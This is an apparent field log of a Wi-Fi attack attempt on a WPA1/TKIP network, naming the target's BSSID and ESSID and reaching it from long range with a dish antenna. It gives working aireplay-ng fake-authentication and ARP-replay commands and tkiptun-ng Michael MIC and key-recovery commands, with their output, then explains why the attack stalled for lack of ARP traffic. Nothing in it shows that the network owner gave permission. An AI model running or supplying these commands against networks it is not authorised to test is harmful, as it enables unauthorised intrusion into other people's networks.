# BWA-0A6C60 TKIP Case Study

**Date:** 2026-05-25
**Location:** Dish antenna (Vye mini, Alfa AWUS036NH, 25dBi dish)
**BSSID:** 98:F5:37:57:0C:3D
**ESSID:** BWA-0A6C60
**Channel:** 13 (2472 MHz)
**Signal:** -76 dBm

## Beacon Analysis

Pure WPA1 (NO RSN IE). ZTE router (OUI: zte_57:0c:3d).

WPA Information Element (tag 221, Microsoft OUI 00:50:f2, type 1):
- WPA Version: 1
- Multicast Cipher Suite: TKIP (type 2)
- Unicast Cipher Suite List: AES (CCM) + TKIP
- AKM Suite: PSK

## Attack Sequence

### 1. Fake auth + association
```
aireplay-ng -1 0 -e BWA-0A6C60 -a 98:F5:37:57:0C:3D wlan0
```
Result: Association successful, AID: 1. Two attempts needed (first retried).

### 2. Data frame capture
23 data frames in 24 seconds (1/sec). Captured 10 encrypted data frames in 15s.
Signal: -69 to -75 dBm. 802.11b rates (1.0 Mb/s).

### 3. Michael MIC validation
```
tkiptun-ng -a 98:F5:37:57:0C:3D -h 8C:07:34:85:BF:94 -r /tmp/bwa_data.pcap wlan0
```
Output:
```
Blub 2:38 E6 38 1C 24 15 1C CF
Blub 1:17 DD 0D 69 1D C3 1F EE
Blub 3:29 31 79 E7 E6 CF 8D 5E
Michael Test: Successful
```

### 4. ARP replay attempt
```
aireplay-ng -3 -b 98:F5:37:57:0C:3D -h 8C:07:34:85:BF:94 wlan0
```
Result: 0 ARP requests in 4600+ packets. Dead end.

### 5. Live tkiptun-ng attempt
```
tkiptun-ng -a 98:F5:37:57:0C:3D -h 8C:07:34:85:BF:94 -x 10 wlan0
```
Result: Michael test passes, deauth/reconnect loop runs, but no replayable packet found.

## Verdict

Closest TKIP target to success. Live encrypted traffic exists, Michael MIC validated,
but no ARP packets flow. The data frames are mDNS/SSDP/keepalive from IoT devices.
Without a real client generating ARP, tkiptun-ng has nothing to replay.

The chicken-and-egg problem: need TKIP key to join as real client and generate ARP,
but need ARP to break TKIP.
